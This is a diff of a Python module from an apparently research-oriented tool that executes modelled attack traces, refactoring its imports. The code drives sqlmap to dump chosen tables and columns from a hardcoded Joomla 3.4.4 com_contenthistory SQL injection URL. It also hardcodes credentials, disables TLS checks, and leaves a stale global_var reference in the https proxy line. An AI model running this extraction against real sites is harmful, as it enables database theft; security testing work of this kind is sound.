@@ -6,15 +6,15 @@ This module executes a trace
 
 
 import re
-import global_var
+import config
 import requests
 import linecache
 import parser
-from my_print import cprint
+from modules.logger import cprint
 # disable warnings when making unverified HTTPS requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-import wrapper.sqlmap
+import modules.wrapper.sqlmap as sqlmap
 import json
 import threading
 import itertools
@@ -32,7 +32,7 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
     cprint("Executing the attack trace")
 
     # load the concretization file
-    with open(global_var.concretization,"r") as data_file:
+    with open(config.concretization,"r") as data_file:
          concretization_data = json.load(data_file)
 
     atexit.register(exitcleanup)
@@ -317,16 +317,16 @@ def __execute_request(request):
     cprint(headers)
     #url = 'https://157.27.244.25/chained'
     headers2 = {'user-agent': 'my-app/0.0.1'}
-    if global_var.proxy != None:
-        proxies = {"http" : "http://"+global_var.proxy,"https":"https://"+global_var.proxy}
+    if config.proxy != None:
+        proxies = {"http" : "http://"+config.proxy,"https":"https://"+global_var.proxy}
     r = None
     if method == "GET":
-        if global_var.proxy != None:
+        if config.proxy != None:
             r = s.get(url,proxies=proxies,params=params, cookies=headers, verify=False, auth=('regis','password'))
         else:
             r = s.get(url,params=params, verify=False, cookies=headers,auth=('regis','password'))
     else:
-        if global_var.proxy != None:
+        if config.proxy != None:
             r = s.post(url,proxies=proxies, data = params, cookies=headers,verify=False, auth=('regis','password'))
         else:
             r = s.post(url, data = params, verify=False, cookies=headers,auth=('regis','password'))
@@ -365,11 +365,11 @@ def __execute_sqlmap(sqlmap_details):
     data_to_extract = sqlmap_details["extract"]
 
     cprint("Execute sqlmap")
-    wrapper.sqlmap.run_api_server()
-    task = wrapper.sqlmap.new_task()
-    wrapper.sqlmap.set_option("authType","Basic",task)
-    wrapper.sqlmap.set_option("authCred","regis:password",task)
-    wrapper.sqlmap.set_option("dropSetCookie","false",task)
+    sqlmap.run_api_server()
+    task = sqlmap.new_task()
+    sqlmap.set_option("authType","Basic",task)
+    sqlmap.set_option("authCred","regis:password",task)
+    sqlmap.set_option("dropSetCookie","false",task)
 
     url_params = ""
     for k,v in params.items():
@@ -377,22 +377,22 @@ def __execute_sqlmap(sqlmap_details):
     url_params = url_params[:-1]
     if method == "GET":
         url = url+"?"+url_params
-        wrapper.sqlmap.set_option("url",url,task)
+        sqlmap.set_option("url",url,task)
     elif method == "POST":
-        wrapper.sqlmap.set_option("url",url,task)
-        wrapper.sqlmap.set_option("data",url_params,task)
-    wrapper.sqlmap.set_option("dumpTable","true",task)
+        sqlmap.set_option("url",url,task)
+        sqlmap.set_option("data",url_params,task)
+    sqlmap.set_option("dumpTable","true",task)
     for tblcol in data_to_extract:
         tbl_list = tblcol.split(".")
         cprint(tbl_list[0],"D")
-        wrapper.sqlmap.set_option("tbl",tbl_list[0],task)
-        wrapper.sqlmap.set_option("col",tbl_list[1],task)
+        sqlmap.set_option("tbl",tbl_list[0],task)
+        sqlmap.set_option("col",tbl_list[1],task)
 
-    #wrapper.sqlmap.set_option("data","username=?&password=?",task)
-    #wrapper.sqlmap.set_option("tbl","users",task)
+    #sqlmap.set_option("data","username=?&password=?",task)
+    #sqlmap.set_option("tbl","users",task)
 
-    wrapper.sqlmap.start_scan("https://157.27.244.25/joomla3.4.4/index.php?list[select]=?&option=com_contenthistory&view=history",task)
-    #wrapper.sqlmap.start_scan(url,task)
+    sqlmap.start_scan("https://157.27.244.25/joomla3.4.4/index.php?list[select]=?&option=com_contenthistory&view=history",task)
+    #sqlmap.start_scan(url,task)
     cprint(url,"D")
     cprint(method,"D")
     cprint(params,"D")
@@ -401,14 +401,14 @@ def __execute_sqlmap(sqlmap_details):
     stopFlag = threading.Event()
     sqlmap_output = ""
     while not stopFlag.wait(5):
-        r = wrapper.sqlmap.get_status(task)
+        r = sqlmap.get_status(task)
         if "terminated" in r:
             cprint("Analysis terminated","V")
-            sqlmap_output = wrapper.sqlmap.get_data(task)
+            sqlmap_output = sqlmap.get_data(task)
             stopFlag.set()
         else:
             cprint("Analysis in progress ... ","V")
-            cprint(wrapper.sqlmap.get_log(task),"D")
+            cprint(sqlmap.get_log(task),"D")
     
     # Let's parse the data extracted
     cprint(sqlmap_output,"D")
@@ -425,13 +425,13 @@ def __execute_sqlmap(sqlmap_details):
         try:
             extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
         except Exception:
-            cprint(wrapper.sqlmap.get_log(task),"V")
+            cprint(sqlmap.get_log(task),"V")
             cprint("error in the sqlmap output","E")
-            wrapper.sqlmap.kill
+            sqlmap.kill
             cprint(sqlmap_output,"D")
             exit()
         cprint("Ending sqlmap extraction","D") 
-        wrapper.sqlmap.kill()
+        sqlmap.kill()
     return extracted_values
 
 """
